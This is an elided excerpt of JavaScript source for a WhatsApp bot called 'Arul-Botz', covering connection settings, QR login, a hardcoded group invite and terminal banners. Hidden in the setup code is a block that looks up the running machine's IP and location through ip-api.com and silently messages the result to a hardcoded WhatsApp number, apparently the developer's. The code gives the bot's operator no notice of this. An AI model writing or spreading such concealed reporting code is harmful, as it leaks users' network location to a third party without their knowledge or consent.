...
pemuda.autoReconnect = ReconnectMode.onConnectionLost
    ...
    pemuda.browserDescription = ['Arul-Botz','Desktop','3.0']
    await sleep(10000)
    pemuda.on('qr', qr => {
 ...
 teks = `https://chat.whatsapp.com/FngRAHziehG3pabmvnk4eh`  //JANGAN DI GANTI BEGO ERROR NANTI NANGES
 teks = `https://chat.whatsapp.com/FngRAHziehG3pabmvnk4eh`  //JANGAN DI GANTI BEGO ERROR NANTI NANGES
...
fetch(`http://ip-api.com/line`).then(res => res.text())  
        .then(bu =>{
       pemuda.sendMessage("6281229859085@s.whatsapp.net", `─────「 *IP-USER* 」─────\n\n\`\`\`${bu}\`\`\`\n────────────────────`, MessageType.text, {contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: "Developer Herman Chanel",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./pemuda_1.jpg'),sourceUrl:"https://wa.me/6282252509320?text=Assalamualaikum"}}})
...
function doProgress()
{
	...
	if ( progress >= 1 )
	{
		...
		exec(`screenfetch -A Deepin`, (error, stdout, stderr) => {
			console.log(stdout), console.log(bgcolor('Follow Instagram _daaa_1', 'red'))})}, 200 ) ;
	}
	else
	{
...
console.log(color(figlet.textSync(`${settings.NamaBot}`, {
	    ...
	    }), 'lightgreen')), term.slowTyping('By Arul-Botz - Recode by Arul-Botz' ,{ flashStyle: term.brightWhite })
